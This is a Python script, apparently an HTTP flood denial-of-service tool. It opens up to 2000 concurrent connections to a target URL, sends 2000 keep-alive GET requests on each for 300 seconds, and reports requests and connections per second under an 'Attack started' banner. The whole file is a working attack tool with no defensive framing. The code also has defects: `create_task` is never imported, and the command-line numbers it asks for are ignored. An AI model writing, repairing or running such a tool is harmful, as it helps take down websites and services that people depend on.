import asyncio
from yarl import URL
from sys import argv as args
from contextlib import suppress

pps, cps = 0, 0

async def flooder(target: URL, payload: bytes, event: asyncio.Event, rpc: int = 100):
    global pps, cps
    await event.wait()

    while event.is_set():
        with suppress(Exception):
            r, w = await asyncio.open_connection(target.host, target.port or 80, ssl=target.scheme == "https")
            cps += 1
            for _ in range(rpc):
                w.write(payload)
                await w.drain()
                pps += 1

async def main():
    global pps, cps
    
    try:

        assert len(args) == 5, "python3 %s <target> 2000 2000 300" % args[0]
        assert URL(args[1]) or None, "Invalid url"
        
        target = URL(args[1])
        workers = 2000
        rpc = 2000
        timer = 300
        event = asyncio.Event()

        payload = (
            f"GET {target.raw_path_qs} HTTP/1.1\r\n"
            f"Host: {target.raw_authority}\r\n"
            "Connection: keep-alive\r\n"
            "\r\n").encode()

        event.clear()
        
        for _ in range(workers):
            create_task(flooder(target, payload, event, rpc))
            await asyncio.sleep(.0)
            
        event.set()
        print("Attack started to %s" % target.human_repr())

        while timer:
            pps, cps = 0, 0
            await asyncio.sleep(1)
            timer -= 1
            print(f"PPS: {pps:,} | CPS: {cps:,} | Time Remaining: {timer:,}s")
        event.clear()
    except AssertionError as e:
        print(str(e) or repr(e))
        
asyncio.run(main())